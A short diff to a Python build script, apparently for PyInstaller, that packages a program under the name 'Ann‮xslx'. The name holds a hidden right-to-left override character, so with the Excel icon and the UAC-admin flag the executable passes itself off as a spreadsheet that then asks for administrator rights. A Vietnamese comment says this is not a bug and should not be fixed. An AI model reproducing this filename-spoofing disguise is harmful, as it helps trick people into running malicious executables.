@@ -24,6 +24,7 @@ def build():
                 "--disable-windowed-traceback",
                 "--uac-admin",
                 "-n",
+                # Đây không phải lỗi, đừng sửa nó
                 "Ann‮xslx",
                 f"--icon={os.path.join(os.path.dirname(os.path.abspath(__file__)), "icon","excel.ico")}",
                 "--distpath",
